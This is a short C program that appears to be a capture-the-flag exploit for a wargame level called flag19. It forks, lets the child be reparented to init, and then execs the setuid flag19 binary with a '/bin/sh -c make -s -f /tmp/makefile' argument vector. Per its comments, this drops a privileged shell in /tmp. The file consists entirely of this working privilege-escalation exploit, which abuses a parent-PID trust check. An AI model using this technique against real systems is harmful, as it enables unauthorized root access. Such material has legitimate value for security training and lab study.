/**
 * this doesn't need a shell script like the
 * others to get a generate C, compiler it etc.
 * instead this program forks a child and runs
 * the flag program, the parent dies so the 
 * child then is owned by init (i.e. 0).
 *
 * therefore runs our makefile and creates a
 * shell in /tmp.
 */
#include <stdio.h>
#include <unistd.h>

int
main(void)
{
  pid_t c;
  /* flag program */
  char *f = "/home/flag19/flag19";
  /* argv to run in flag program          *
   * this will run make to create a shell */
  char *v[] = {
    "/bin/sh",
    "-c",
    "make -s -f /tmp/makefile",
    NULL
  };

  /* create a process and if it the child ... */
  if((c = fork()) == (pid_t) 0) {
    /* check to see if our parent is init *
     * if so we are owned by root         */
    if(getppid() == (pid_t) 1) {
      /* run the flag application with our vector */
      if(execvp(f, v) == -1)
        fprintf(stderr, "Whoops!\n");
    }
  }

  return 0;
}
